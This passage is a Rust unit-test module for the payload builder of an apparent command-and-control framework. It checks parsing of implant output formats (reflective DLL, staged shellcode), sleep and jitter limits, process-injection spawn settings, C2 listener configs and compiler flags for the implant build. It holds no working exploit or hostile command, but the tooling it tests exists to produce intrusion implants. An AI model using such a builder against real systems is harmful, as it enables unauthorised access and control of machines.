        assert_eq!(Architecture::parse(" x64 ").unwrap(), Architecture::X64);
    }

    #[test]
    fn architecture_parse_accepts_x86_case_insensitive() {
        assert_eq!(Architecture::parse("x86").unwrap(), Architecture::X86);
        assert_eq!(Architecture::parse("X86").unwrap(), Architecture::X86);
    }

    #[test]
    fn architecture_parse_rejects_unknown() {
        let err = Architecture::parse("arm64").expect_err("arm64 should be rejected");
        assert!(matches!(err, PayloadBuildError::InvalidRequest { message }
            if message.contains("arm64")));
    }

    #[test]
    fn architecture_suffix_and_nasm_format() {
        assert_eq!(Architecture::X64.suffix(), ".x64");
        assert_eq!(Architecture::X86.suffix(), ".x86");
        assert_eq!(Architecture::X64.nasm_format(), "win64");
        assert_eq!(Architecture::X86.nasm_format(), "win32");
    }

    // ── OutputFormat::parse comprehensive tests ───────────────────────────

    #[test]
    fn output_format_parses_all_known_formats() {
        let cases = [
            ("Windows Exe", OutputFormat::Exe, ".exe"),
            ("Windows Service Exe", OutputFormat::ServiceExe, ".exe"),
            ("Windows Dll", OutputFormat::Dll, ".dll"),
            ("Windows Reflective Dll", OutputFormat::ReflectiveDll, ".dll"),
            ("Windows Shellcode", OutputFormat::Shellcode, ".bin"),
            ("Windows Shellcode Staged", OutputFormat::StagedShellcode, ".exe"),
            ("Windows Raw Shellcode", OutputFormat::RawShellcode, ".bin"),
        ];
        for (input, expected_variant, expected_ext) in cases {
            let parsed =
                OutputFormat::parse(input).unwrap_or_else(|_| panic!("should parse `{input}`"));
            assert_eq!(parsed, expected_variant, "variant mismatch for `{input}`");
            assert_eq!(parsed.file_extension(), expected_ext, "extension mismatch for `{input}`");
        }
    }

    #[test]
    fn output_format_cache_tags_are_all_unique() {
        use std::collections::HashSet;
        let tags: Vec<&str> = vec![
            OutputFormat::Exe.cache_tag(),
            OutputFormat::ServiceExe.cache_tag(),
            OutputFormat::Dll.cache_tag(),
            OutputFormat::ReflectiveDll.cache_tag(),
            OutputFormat::Shellcode.cache_tag(),
            OutputFormat::StagedShellcode.cache_tag(),
            OutputFormat::RawShellcode.cache_tag(),
        ];
        let unique: HashSet<&str> = tags.iter().copied().collect();
        assert_eq!(
            unique.len(),
            tags.len(),
            "all cache tags must be unique to prevent cache collisions"
        );
    }

    // ── pack_config validation edge cases ─────────────────────────────────

    #[test]
    fn pack_config_rejects_jitter_above_100() {
        let config = serde_json::from_value::<Map<String, Value>>(json!({
            "Sleep": "5",
            "Jitter": "101",
            "Sleep Technique": "WaitForSingleObjectEx",
            "Injection": {
                "Alloc": "Win32",
                "Execute": "Win32",
                "Spawn64": "a",
                "Spawn32": "b"
            }
        }))
        .unwrap();
        let listener = http_listener_with_method(None);
        let err = pack_config(&listener, &config).expect_err("jitter > 100 should be rejected");
        assert!(matches!(
            err,
            PayloadBuildError::InvalidRequest { message }
                if message.contains("Jitter") && message.contains("100")
        ));
    }

    #[test]
    fn pack_config_accepts_jitter_at_boundary_100() -> Result<(), Box<dyn std::error::Error>> {
        let config = serde_json::from_value::<Map<String, Value>>(json!({
            "Sleep": "5",
            "Jitter": "100",
            "Sleep Technique": "WaitForSingleObjectEx",
            "Injection": {
                "Alloc": "Win32",
                "Execute": "Win32",
                "Spawn64": "a",
                "Spawn32": "b"
            }
        }))?;
        let listener = http_listener_with_method(None);
        pack_config(&listener, &config)?;
        Ok(())
    }

    #[test]
    fn pack_config_accepts_jitter_at_boundary_0() -> Result<(), Box<dyn std::error::Error>> {
        let config = serde_json::from_value::<Map<String, Value>>(json!({
            "Sleep": "5",
            "Jitter": "0",
            "Sleep Technique": "WaitForSingleObjectEx",
            "Injection": {
                "Alloc": "Win32",
                "Execute": "Win32",
                "Spawn64": "a",
                "Spawn32": "b"
            }
        }))?;
        let listener = http_listener_with_method(None);
        pack_config(&listener, &config)?;
        Ok(())
    }

    // ── merged_request_config override tests ──────────────────────────────

    #[test]
    fn merged_request_config_request_overrides_profile_defaults()
    -> Result<(), Box<dyn std::error::Error>> {
        let config = merged_request_config(
            r#"{"Sleep":"20","Jitter":"50","Injection":{"Alloc":"Win32","Execute":"Win32"}}"#,
            &DemonConfig {
                sleep: Some(5),
                jitter: Some(10),
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: None,
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                allow_legacy_ctr: false,
            },
        )?;
        // Request values should override profile defaults.
        assert_eq!(config.get("Sleep"), Some(&Value::String("20".to_owned())));
        assert_eq!(config.get("Jitter"), Some(&Value::String("50".to_owned())));
        Ok(())
    }

    #[test]
    fn merged_request_config_injection_spawn_overrides_profile()
    -> Result<(), Box<dyn std::error::Error>> {
        let config = merged_request_config(
            r#"{"Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"custom64.exe","Spawn32":"custom32.exe"}}"#,
            &DemonConfig {
                sleep: None,
                jitter: None,
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: Some(red_cell_common::config::ProcessInjectionConfig {
                    spawn64: Some("default64.exe".to_owned()),
                    spawn32: Some("default32.exe".to_owned()),
                }),
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                allow_legacy_ctr: false,
            },
        )?;
        assert_eq!(config["Injection"]["Spawn64"], Value::String("custom64.exe".to_owned()));
        assert_eq!(config["Injection"]["Spawn32"], Value::String("custom32.exe".to_owned()));
        Ok(())
    }

    #[test]
    fn merged_request_config_rejects_non_object_input() {
        let err = merged_request_config(
            r#""just a string""#,
            &DemonConfig {
                sleep: None,
                jitter: None,
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: None,
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                allow_legacy_ctr: false,
            },
        )
        .expect_err("non-object JSON should be rejected");
        assert!(matches!(err, PayloadBuildError::InvalidRequest { message }
            if message.contains("JSON object")));
    }

    // ── format_config_bytes tests ─────────────────────────────────────────

    #[test]
    fn format_config_bytes_formats_correctly() {
        assert_eq!(format_config_bytes(&[0x00, 0xFF, 0x42]), r"0x00\,0xff\,0x42");
    }

    #[test]
    fn format_config_bytes_empty_input() {
        assert_eq!(format_config_bytes(&[]), "");
    }

    #[test]
    fn format_config_bytes_single_byte() {
        assert_eq!(format_config_bytes(&[0xAB]), "0xab");
    }

    // ── proxy_url tests ───────────────────────────────────────────────────

    #[test]
    fn proxy_url_formats_with_default_scheme() {
        let proxy = DomainHttpListenerProxyConfig {
            enabled: true,
            proxy_type: None,
            host: "proxy.local".to_owned(),
            port: 8080,
            username: None,
            password: None,
        };
        assert_eq!(proxy_url(&proxy), "http://proxy.local:8080");
    }

    #[test]
    fn proxy_url_uses_configured_scheme() {
        let proxy = DomainHttpListenerProxyConfig {
            enabled: true,
            proxy_type: Some("socks5".to_owned()),
            host: "socks.local".to_owned(),
            port: 1080,
            username: None,
            password: None,
        };
        assert_eq!(proxy_url(&proxy), "socks5://socks.local:1080");
    }

    // ── parse_version_triple tests ────────────────────────────────────────

    #[test]
    fn parse_version_triple_full() {
        assert_eq!(parse_version_triple("12.2.0"), Some((12, 2, 0)));
    }

    #[test]
    fn parse_version_triple_major_only() {
        assert_eq!(parse_version_triple("10"), Some((10, 0, 0)));
    }

    #[test]
    fn parse_version_triple_major_minor_only() {
        assert_eq!(parse_version_triple("2.16"), Some((2, 16, 0)));
    }

    #[test]
    fn parse_version_triple_rejects_empty() {
        assert_eq!(parse_version_triple(""), None);
    }

    #[test]
    fn parse_version_triple_rejects_non_numeric() {
        assert_eq!(parse_version_triple("abc"), None);
    }

    // ── parse_header_u32_field tests ──────────────────────────────────────

    #[test]
    fn parse_header_u32_field_decimal() -> Result<(), PayloadBuildError> {
        assert_eq!(parse_header_u32_field("CompileTime", "42")?, 42);
        Ok(())
    }

    #[test]
    fn parse_header_u32_field_hex_lowercase() -> Result<(), PayloadBuildError> {
        assert_eq!(parse_header_u32_field("CompileTime", "0x1a2b")?, 0x1a2b);
        Ok(())
    }

    #[test]
    fn parse_header_u32_field_hex_uppercase_prefix() -> Result<(), PayloadBuildError> {
        assert_eq!(parse_header_u32_field("CompileTime", "0X1A2B")?, 0x1a2b);
        Ok(())
    }

    #[test]
    fn parse_header_u32_field_trims_whitespace() -> Result<(), PayloadBuildError> {
        assert_eq!(parse_header_u32_field("CompileTime", "  100  ")?, 100);
        Ok(())
    }

    #[test]
    fn parse_header_u32_field_rejects_non_numeric() {
        let err = parse_header_u32_field("CompileTime", "not-a-number")
            .expect_err("non-numeric should be rejected");
        assert!(matches!(err, PayloadBuildError::InvalidRequest { .. }));
    }

    // ── stager_cache_bytes tests ──────────────────────────────────────────

    #[test]
    fn stager_cache_bytes_includes_host_port_uri_secure() -> Result<(), Box<dyn std::error::Error>>
    {
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["c2.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 80,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: vec!["/stage".to_owned()],
            host_header: None,
            secure: true,
            cert: None,
            response: None,
            proxy: None,
        }));

        let bytes = stager_cache_bytes(&listener)?;
        // Should contain the host string, null separator, port bytes, uri, null, secure flag.
        assert!(bytes.starts_with(b"c2.local\0"));
        // Port 443 in LE bytes: 0xBB, 0x01
        let port_offset = b"c2.local\0".len();
        assert_eq!(u16::from_le_bytes([bytes[port_offset], bytes[port_offset + 1]]), 443);
        assert!(bytes.ends_with(&[1])); // secure=true
        Ok(())
    }

    #[test]
    fn stager_cache_bytes_rejects_non_http_listener() {
        let listener = ListenerConfig::Smb(red_cell_common::SmbListenerConfig {
            name: "smb".to_owned(),
            pipe_name: "pivot".to_owned(),
            kill_date: None,
            working_hours: None,
        });
        let err = stager_cache_bytes(&listener).expect_err("non-HTTP listener should be rejected");
        assert!(matches!(
            err,
            PayloadBuildError::InvalidRequest { message }
                if message.contains("HTTP listener")
        ));
    }

    #[test]
    fn stager_cache_bytes_differs_when_inputs_differ() -> Result<(), Box<dyn std::error::Error>> {
        let make_listener = |host: &str, port: u16, secure: bool| {
            ListenerConfig::Http(Box::new(HttpListenerConfig {
                name: "http".to_owned(),
                kill_date: None,
                working_hours: None,
                hosts: vec![host.to_owned()],
                host_bind: "0.0.0.0".to_owned(),
                host_rotation: "round-robin".to_owned(),
                port_bind: port,
                port_conn: None,
                method: None,
                behind_redirector: false,
                trusted_proxy_peers: Vec::new(),
                user_agent: None,
                headers: Vec::new(),
                uris: Vec::new(),
                host_header: None,
                secure,
                cert: None,
                response: None,
                proxy: None,
            }))
        };

        let a = stager_cache_bytes(&make_listener("host-a", 80, false))?;
        let b = stager_cache_bytes(&make_listener("host-b", 80, false))?;
        let c = stager_cache_bytes(&make_listener("host-a", 8080, false))?;
        let d = stager_cache_bytes(&make_listener("host-a", 80, true))?;

        assert_ne!(a, b, "different hosts must produce different cache bytes");
        assert_ne!(a, c, "different ports must produce different cache bytes");
        assert_ne!(a, d, "different secure flags must produce different cache bytes");
        Ok(())
    }

    // ── disabled_for_tests structural tests ───────────────────────────────

    #[test]
    fn disabled_for_tests_creates_valid_service() {
        let svc = PayloadBuilderService::disabled_for_tests();
        // Should not panic and should have sensible defaults.
        assert_eq!(svc.inner.toolchain.compiler_x64, PathBuf::from("/nonexistent/x64-gcc"));
        assert_eq!(svc.inner.toolchain.compiler_x86, PathBuf::from("/nonexistent/x86-gcc"));
        assert_eq!(svc.inner.toolchain.nasm, PathBuf::from("/nonexistent/nasm"));
        assert_eq!(svc.inner.toolchain.compiler_x64_version.major, 0);
        assert_eq!(svc.inner.default_demon.sleep, None);
        assert!(!svc.inner.default_demon.indirect_syscall);
        assert!(svc.inner.binary_patch.is_none());
    }

    #[test]
    fn disabled_for_tests_is_cloneable() {
        let svc1 = PayloadBuilderService::disabled_for_tests();
        let svc2 = svc1.clone();
        // Both should share the same inner Arc.
        assert!(Arc::ptr_eq(&svc1.inner, &svc2.inner));
    }

    // ── required_u32 parsing tests ────────────────────────────────────────

    #[test]
    fn required_u32_parses_string_value() -> Result<(), PayloadBuildError> {
        let config = serde_json::from_value::<Map<String, Value>>(json!({"val": "42"})).unwrap();
        assert_eq!(required_u32(&config, "val")?, 42);
        Ok(())
    }

    #[test]
    fn required_u32_parses_number_value() -> Result<(), PayloadBuildError> {
        let config = serde_json::from_value::<Map<String, Value>>(json!({"val": 42})).unwrap();
        assert_eq!(required_u32(&config, "val")?, 42);
        Ok(())
    }

    #[test]
    fn required_u32_rejects_missing_key() {
        let config = serde_json::from_value::<Map<String, Value>>(json!({})).unwrap();
        let err = required_u32(&config, "missing").expect_err("missing key should fail");
        assert!(matches!(err, PayloadBuildError::InvalidRequest { message }
            if message.contains("missing")));
    }

    #[test]
    fn required_u32_rejects_non_numeric_string() {
        let config = serde_json::from_value::<Map<String, Value>>(json!({"val": "abc"})).unwrap();
        let err = required_u32(&config, "val").expect_err("non-numeric should fail");
        assert!(matches!(err, PayloadBuildError::InvalidRequest { .. }));
    }

    // ── build_defines tests ───────────────────────────────────────────────

    #[test]
    fn build_defines_includes_transport_and_config_for_http()
    -> Result<(), Box<dyn std::error::Error>> {
        let listener = http_listener_with_method(None);
        let config_bytes = &[0x01, 0x02, 0x03];
        let defines = build_defines(&listener, config_bytes, false)?;
        assert!(defines.iter().any(|d| d == "TRANSPORT_HTTP"), "TRANSPORT_HTTP missing");
        assert!(defines.iter().any(|d| d.starts_with("CONFIG_BYTES=")), "CONFIG_BYTES missing");
        assert_eq!(defines.len(), 2, "should have exactly config + transport defines");
        Ok(())
    }

    #[test]
    fn build_defines_includes_shellcode_define_when_requested()
    -> Result<(), Box<dyn std::error::Error>> {
        let listener = http_listener_with_method(None);
        let defines = build_defines(&listener, &[0x01], true)?;
        assert!(defines.iter().any(|d| d == "SHELLCODE"), "SHELLCODE define missing");
        assert_eq!(defines.len(), 3);
        Ok(())
    }

    #[test]
    fn build_defines_uses_transport_smb_for_smb_listener() -> Result<(), Box<dyn std::error::Error>>
    {
        let listener = ListenerConfig::Smb(red_cell_common::SmbListenerConfig {
            name: "smb".to_owned(),
            pipe_name: "pivot".to_owned(),
            kill_date: None,
            working_hours: None,
        });
        let defines = build_defines(&listener, &[0x01], false)?;
        assert!(defines.iter().any(|d| d == "TRANSPORT_SMB"), "TRANSPORT_SMB missing");
        Ok(())
    }

    #[test]
    fn build_defines_rejects_dns_listener() {
        let listener = ListenerConfig::Dns(red_cell_common::DnsListenerConfig {
            name: "dns".to_owned(),
            host_bind: "0.0.0.0".to_owned(),
            port_bind: 53,
            domain: "c2.local".to_owned(),
            record_types: vec!["TXT".to_owned()],
            kill_date: None,
            working_hours: None,
        });
        let err =
            build_defines(&listener, &[0x01], false).expect_err("DNS listener should be rejected");
        assert!(matches!(err, PayloadBuildError::InvalidRequest { .. }));
    }

    // ── main_args tests ───────────────────────────────────────────────────

    #[test]
    fn main_args_exe_includes_main_threaded_and_entry_point() {
        let args = main_args(Architecture::X64, OutputFormat::Exe);
        assert!(args.contains(&"MAIN_THREADED"));
        assert!(args.contains(&"WinMain"));
        assert!(args.contains(&"src/main/MainExe.c"));
    }

    #[test]
    fn main_args_exe_x86_uses_underscore_prefix() {
        let args = main_args(Architecture::X86, OutputFormat::Exe);
        assert!(args.contains(&"_WinMain"));
    }

    #[test]
    fn main_args_service_exe_includes_svc_flag() {
        let args = main_args(Architecture::X64, OutputFormat::ServiceExe);
        assert!(args.contains(&"SVC_EXE"));
        assert!(args.contains(&"src/main/MainSvc.c"));
    }

    #[test]
    fn main_args_dll_uses_shared_and_dllmain() {
        let args = main_args(Architecture::X64, OutputFormat::Dll);
        assert!(args.contains(&"-shared"));
        assert!(args.contains(&"DllMain"));
        assert!(args.contains(&"src/main/MainDll.c"));
    }

    #[test]
    fn main_args_shellcode_returns_empty() {
        assert!(main_args(Architecture::X64, OutputFormat::Shellcode).is_empty());
        assert!(main_args(Architecture::X64, OutputFormat::RawShellcode).is_empty());
        assert!(main_args(Architecture::X64, OutputFormat::StagedShellcode).is_empty());
    }

    // ── default_compiler_flags tests ──────────────────────────────────────

    #[test]
    fn default_compiler_flags_always_includes_pic_and_optimization() {
        for format in [OutputFormat::Exe, OutputFormat::Dll, OutputFormat::ServiceExe] {
            let flags = default_compiler_flags(format);
            assert!(flags.contains(&"-Os"), "missing -Os for {format:?}");
            assert!(flags.contains(&"-fPIC"), "missing -fPIC for {format:?}");
            assert!(flags.contains(&"-mwindows"), "missing -mwindows for {format:?}");
        }
    }

    #[test]
    fn default_compiler_flags_service_exe_links_advapi32() {
        let flags = default_compiler_flags(OutputFormat::ServiceExe);
        assert!(flags.contains(&"-ladvapi32"));
        assert!(!flags.contains(&"-nostdlib"), "service exe should not use -nostdlib");
    }

    #[test]
    fn default_compiler_flags_non_service_uses_nostdlib() {
        for format in [OutputFormat::Exe, OutputFormat::Dll, OutputFormat::ReflectiveDll] {
            let flags = default_compiler_flags(format);
            assert!(flags.contains(&"-nostdlib"), "missing -nostdlib for {format:?}");
        }
    }

    // ── VersionRequirement tests ──────────────────────────────────────────

    #[test]
    fn version_requirement_satisfied_by_exact_match() {
        let req = VersionRequirement { major: 10, minor: 0 };
        let ver = ToolchainVersion { major: 10, minor: 0, patch: 0, raw: "10.0.0".to_owned() };
        assert!(req.is_satisfied_by(&ver));
    }

    #[test]
    fn version_requirement_satisfied_by_higher_version() {
        let req = VersionRequirement { major: 10, minor: 0 };
        let ver = ToolchainVersion { major: 12, minor: 2, patch: 0, raw: "12.2.0".to_owned() };
        assert!(req.is_satisfied_by(&ver));
    }

    #[test]
    fn version_requirement_not_satisfied_by_lower_version() {
        let req = VersionRequirement { major: 10, minor: 0 };
        let ver = ToolchainVersion { major: 9, minor: 99, patch: 0, raw: "9.99.0".to_owned() };
        assert!(!req.is_satisfied_by(&ver));
    }

    // ── BuildProgress and PayloadArtifact derive tests ────────────────────

    #[test]
    fn build_progress_clone_and_eq() {
        let a = BuildProgress { level: "Info".to_owned(), message: "test".to_owned() };
        let b = a.clone();
        assert_eq!(a, b);
    }

    #[test]
    fn payload_artifact_clone_and_eq() {
        let a = PayloadArtifact {
            bytes: vec![1, 2, 3],
            file_name: "test.exe".to_owned(),
            format: "Windows Exe".to_owned(),
        };
        let b = a.clone();
        assert_eq!(a, b);
    }

    // ── PayloadBuildError display tests ────────────────────────────────────

    #[test]
    fn payload_build_error_display_messages() {
        let err = PayloadBuildError::ToolchainUnavailable { message: "nasm missing".to_owned() };
        assert!(err.to_string().contains("nasm missing"));

        let err = PayloadBuildError::InvalidRequest { message: "bad arch".to_owned() };
        assert!(err.to_string().contains("bad arch"));

        let err =
            PayloadBuildError::CommandFailed { command: "gcc".to_owned(), diagnostics: vec![] };
        assert!(err.to_string().contains("gcc"));
    }
}
